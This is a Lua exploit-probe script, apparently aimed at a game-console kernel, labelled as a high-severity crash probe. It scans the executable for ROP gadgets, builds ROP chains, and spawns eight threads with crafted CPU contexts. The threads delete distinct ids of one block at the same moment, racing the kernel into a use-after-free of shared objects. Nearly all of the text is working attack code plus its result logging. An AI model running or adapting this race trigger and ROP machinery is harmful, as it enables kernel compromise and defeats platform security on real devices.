-- CRASH_CLASS: HIGH
-- PROBE 761a: simultaneous deletes of distinct block ids, so path A lands mid-path-B
--
-- The single-id race is settled: with the object polled complete, four callers
-- released by one wake still give exactly one success and three
-- "not present", because they miss at the first lookup. The window that
-- matters is not that one.
--
-- A block create makes one entry T with a per-item count in [T+2]. Each delete
-- takes the count-1 path only when the count it reads is 1; otherwise it takes
-- path B, which touches the shared objects S and P. Path A frees S and P.
-- So if several callers delete distinct items of the same block at once, the
-- caller that arrives last can free S while another caller is still inside
-- path B using S.
--
-- Eight children block in read, one write releases them, each deletes its own
-- id of an eight item block. Every child stores its syscall return and its
-- status. After each round a create/poll/delete cycle checks the allocator.

print("=== PROBE 761a: DISTINCT ID RACE, PATH A MID PATH B ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local fn = to_num(syscall.pipe.fn_addr)
print(string.format("[A] tid=%s fn=%08X", tostring(call(syscall.pipe, 20,0,0,0,0,0,0)), fn))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local ebase = nil
do
    local rb = mmap(0x8000)
    local cnt = to_num(memory.alloc(8)); wd(cnt, 0)
    call(mk(674), rb, 72, 512, cnt, 0x40000000, 0)
    local n = rd(cnt) or 0
    local best, bsz = nil, 0
    for i=0,math.min(n,512)-1 do
        local r = rb + i*72
        local a = rd(r) + rd(r+4)*4294967296
        local b = rd(r+8) + rd(r+12)*4294967296
        if rd(r+0x18) == 5 and (b-a) > 0x200000 and a < 0x1000000000 and (b-a) > bsz then best, bsz = a, b-a end
    end
    ebase = best
    print(string.format("[A] eboot=%s size=%X", tostring(ebase), bsz))
end
if not ebase then print("[A] no eboot") return end
local function find_pat(base, size, pat)
    local off, limit, chunk = 0, size - 0x20, 0x8000
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
local st_rsi  = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x06,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
if not (st_rsi and jmp_g and pop_rax and pop_rdi and pop_rsi and pop_rdx) then print("[A] gadgets missing") return end

local sv = to_num(memory.alloc(8)); wq(sv, uint64(0))
call(mk(135), 1, 1, 0, sv, 0, 0)
local s0, s1 = rd(sv), rd(sv+4)
print(string.format("[A] fd0=%s fd1=%s", tostring(s0), tostring(s1)))

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local ts = to_num(memory.alloc(16))
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local D = mmap(page)
local idcell = mmap(page)
local ids = mmap(page)
local pay = mmap(page)
local KIDS = 8
local chains, stats, rets = {}, {}, {}
for i=0,KIDS-1 do
    local c = mmap(page)
    stats[i] = mmap(page); rets[i] = mmap(page)
    wq(c+0,  uint64(pop_rdi)); wq(c+8,  uint64(ids + i*4))
    wq(c+16, uint64(pop_rsi)); wq(c+24, uint64(1))
    wq(c+32, uint64(pop_rdx)); wq(c+40, uint64(stats[i]))
    wq(c+48, uint64(pop_rax)); wq(c+56, uint64(662))
    wq(c+64, uint64(fn))
    wq(c+72, uint64(pop_rsi)); wq(c+80, uint64(rets[i]))
    wq(c+88, uint64(st_rsi))
    wq(c+96, uint64(pop_rax)); wq(c+104, uint64(431))
    wq(c+112, uint64(fn));     wq(c+120, uint64(jmp_g))
    chains[i] = c
end
local function spawn(i)
    local ctx = to_num(memory.alloc(0x500))
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(chains[i]))
    wq(ctx+Ctx.RDI, uint64(s0));      wq(ctx+Ctx.RSI, uint64(0))
    wq(ctx+Ctx.RDX, uint64(1));       wq(ctx+Ctx.RAX, uint64(3))
    local tb = to_num(memory.alloc(8)); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

local ROUNDS = 8
local tot_zero, tot_gone, tot_gate, tot_other, anomalies = 0,0,0,0,0
for r=1,ROUNDS do
    zero(D, page); wq(idcell, uint64(0))
    local cr = call(mk(669), 0x1001, D, KIDS, 1, idcell, 0)
    local base = rd(idcell) or 0
    if tostring(cr) ~= "0" or base == 0 then
        print(string.format("[B] r%d create ret=%s base=%s", r, tostring(cr), tostring(base)))
        break
    end
    for i=0,KIDS-1 do wd(ids + i*4, base + i*0x10000) end
    local polls = mmap(page)
    call(mk(664), ids, KIDS, polls, 0, 0, 0)
    local all3 = true
    for i=0,KIDS-1 do
        local v = rd(polls + i*4) or 0
        if v ~= 3 and v ~= 0x10003 then all3 = false end
    end
    local okall = true
    for i=0,KIDS-1 do
        wd(stats[i], 0xCCCCCCCC); wq(rets[i], uint64(0xEEEEEEEEEEEEEEEE))
        if not spawn(i) then okall = false end
    end
    sleep_ms(50)
    for i=0,KIDS-1 do wb(pay+i, 0x41+i) end
    local wr = call(mk(4), s1, pay, KIDS, 0, 0, 0)
    sleep_ms(60)
    local zeros, gone, gate, other = 0,0,0,0
    local line = {}
    for i=0,KIDS-1 do
        local st = rd(stats[i]) or 0
        local rv = rq(rets[i]) or 0
        line[#line+1] = string.format("%08X/%s", st, tostring(rv))
        if st == 0 then zeros = zeros + 1
        elseif st == 0x80020003 then gone = gone + 1
        elseif st == 0x80020010 then gate = gate + 1
        else other = other + 1 end
    end
    tot_zero = tot_zero + zeros; tot_gone = tot_gone + gone
    tot_gate = tot_gate + gate; tot_other = tot_other + other
    -- allocator health: a fresh block of 4, poll, delete all
    zero(D, page); wq(idcell, uint64(0))
    local hbase = 0
    local hcr = call(mk(669), 0x1001, D, 4, 1, idcell, 0)
    hbase = rd(idcell) or 0
    local hstates, hdels = {}, {}
    local hok = (tostring(hcr) == "0" and hbase ~= 0)
    if hok then
        for i=0,3 do wd(ids + i*4, hbase + i*0x10000) end
        local hv = mmap(page)
        call(mk(664), ids, 4, hv, 0, 0, 0)
        for i=0,3 do
            local st = rd(hv + i*4) or 0
            hstates[#hstates+1] = string.format("%X", st)
            call(mk(662), ids + i*4, 1, hv, 0, 0, 0)
            hdels[#hdels+1] = string.format("%X", rd(hv) or 0)
        end
    end
    local bad = (other > 0) or (not hok) or (zeros ~= 1) or (gone ~= KIDS-1)
    local hbad = false
    for _, v in ipairs(hstates) do if v ~= "3" and v ~= "10003" then hbad = true end end
    for _, v in ipairs(hdels) do if v ~= "0" then hbad = true end end
    bad = bad or hbad
    if bad then anomalies = anomalies + 1 end
    print(string.format("[B] r%02d poll3=%s spawn=%s wr=%s zero=%d gone=%d gate=%d other=%d health=%s %s %s%s",
        r, tostring(all3), tostring(okall), tostring(wr), zeros, gone, gate, other,
        tostring(hok), table.concat(hstates, ","), table.concat(hdels, ","),
        bad and "  <-- ANOMALY" or ""))
    if bad then print("    race: "..table.concat(line, " ")) end
end
print(string.format("[C] zero=%d gone=%d gate=%d other=%d anomalies=%d", tot_zero, tot_gone, tot_gate, tot_other, anomalies))
print("[D] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 761a DONE ===")
